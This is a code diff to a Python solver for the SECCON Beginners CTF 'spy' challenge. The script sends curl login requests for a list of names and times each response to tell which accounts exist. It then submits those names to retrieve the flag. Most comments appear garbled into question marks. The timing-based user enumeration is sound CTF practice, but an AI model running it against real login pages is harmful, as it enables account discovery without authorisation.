@@ -1,4 +1,5 @@
 import re
+import time
 import codecs
 import itertools
 import subprocess
@@ -13,17 +14,37 @@ name = ["Arthur","Barbara","Christine","David","Elbert","Franklin","George","Har
 URL1 = "https://spy.quals.beginners.seccon.jp/"
 URL2 = "https://spy.quals.beginners.seccon.jp/challenge"
 
+GET = ["curl", "-X", "GET", ""]
 command = ["curl", "-X", "POST", "-d", "", ""]
 
 param = ["name=" + n + "&password=hogehoge" for n in name]
 ans = []
 
+# ?????????????
+GET[3] = URL1
+init = time.time()
+data = subprocess.check_output(GET)
+# ???????????????????????
+check = 2*(time.time() - init)
+
+"""??????????????????????????
+   ??????????????????????????
+# for i in range(len(param)):
+#     command[4] = param[i]
+#     command[5] = URL1
+#     data = subprocess.check_output(command)
+#     data = re.search(r"[0-9].[0-9]{7}", codecs.decode(data,"utf-8")).group()
+#     if float(data) > 0.01: 
+#         ans.append(name[i])
+"""
+
 for i in range(len(param)):
     command[4] = param[i]
     command[5] = URL1
+    init = time.time()
     data = subprocess.check_output(command)
-    data = re.search(r"[0-9].[0-9]{7}", codecs.decode(data,"utf-8")).group()
-    if float(data) > 0.01: 
+    now = time.time() - init
+    if now > check:
         ans.append(name[i])
 
 ans = ["answer=" + n for n in ans]
@@ -35,8 +56,8 @@ data = re.search(r"ctf4b.*}", codecs.decode(data,"utf-8")).group()
 print()
 print(data)
 
-# 全探索
-"""
+# ???
+"""2^26??????????
 import itertools
 import subprocess
 from subprocess import PIPE
